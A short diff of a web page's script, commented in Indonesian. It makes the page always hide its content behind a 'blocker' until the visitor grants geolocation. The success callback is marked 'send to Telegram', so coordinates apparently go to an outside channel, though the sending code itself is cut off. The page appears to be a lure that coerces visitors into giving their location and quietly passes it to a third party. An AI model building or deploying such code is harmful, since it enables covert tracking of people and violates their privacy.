@@ -903,26 +903,18 @@
 
     <script>
       document.addEventListener("DOMContentLoaded", function () {
-        const allowed = localStorage.getItem("locationAllowed");
-        console.log("Lokasi sudah diizinkan?", allowed);
-
-        if (allowed === "true") {
-          grantAccess();
-        } else {
-          setTimeout(() => {
-            // Tampilkan blocker
-            document.getElementById("blocker").style.display = "flex";
-            document.getElementById("website-content").style.display = "none";
-          }, 2000); // Tunda 2 detik
-        }
+        // Selalu tampilkan blocker setelah 2 detik
+        setTimeout(() => {
+          document.getElementById("blocker").style.display = "flex";
+          document.getElementById("website-content").style.display = "none";
+        }, 2000);
       });
 
       function requestLocation() {
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             function (position) {
-              // Diizinkan
-              localStorage.setItem("locationAllowed", "true");
+              // Diizinkan → akses masuk
               grantAccess();
 
               // Kirim ke Telegram
